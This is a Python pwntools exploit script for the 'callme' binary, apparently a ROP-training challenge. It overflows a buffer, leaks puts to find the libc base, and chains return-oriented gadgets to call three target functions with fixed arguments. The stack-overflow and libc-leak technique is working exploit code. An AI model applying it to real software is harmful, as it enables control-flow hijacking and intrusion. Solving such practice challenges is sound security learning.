#!/bin/python3

from pwn import *

elf = ELF('./callme')
libc = elf.libc

p = process(elf.path)

libc_rop = ROP(elf.libc)
elf_rop = ROP(elf)

# I couldn't find a pop rsi ret using this method, so I'm
#       just gunna get one from libc instead
pop_rdi_ret = elf_rop.find_gadget(['pop rdi', 'ret'])[0]

chain = p64(pop_rdi_ret)        \
    + p64(elf.got['puts'])      \
    + p64(elf.plt['puts'])      \
    + p64(elf.sym['_start'])
payload = b'i' * 0x28 + chain
p.sendline(payload)

p.recvuntil(b'Thank you!\n')
puts_addr = int.from_bytes(p.recv(6), 'little')

libc_base = puts_addr - libc.sym['puts']
print("Libc base address: " + hex(libc_base))

# Finding remaining gadgets for the needed arguments
pop_rsi_ret = libc_base + libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_ret = libc_base + libc_rop.find_gadget(['pop rdx', 'ret'])[0]

chain = p64(pop_rdi_ret)            \
    + p64(0xdeadbeefdeadbeef)       \
    + p64(pop_rsi_ret)              \
    + p64(0xcafebabecafebabe)       \
    + p64(pop_rdx_ret)              \
    + p64(0xd00df00dd00df00d)       \
    + p64(elf.plt['callme_one'])

chain += p64(pop_rdi_ret)           \
    + p64(0xdeadbeefdeadbeef)       \
    + p64(pop_rsi_ret)              \
    + p64(0xcafebabecafebabe)       \
    + p64(pop_rdx_ret)              \
    + p64(0xd00df00dd00df00d)       \
    + p64(elf.plt['callme_two'])

chain += p64(pop_rdi_ret)           \
    + p64(0xdeadbeefdeadbeef)       \
    + p64(pop_rsi_ret)              \
    + p64(0xcafebabecafebabe)       \
    + p64(pop_rdx_ret)              \
    + p64(0xd00df00dd00df00d)       \
    + p64(elf.plt['callme_three'])

payload = b'i' * 0x28 + chain
p.sendline(payload)

p.interactive()
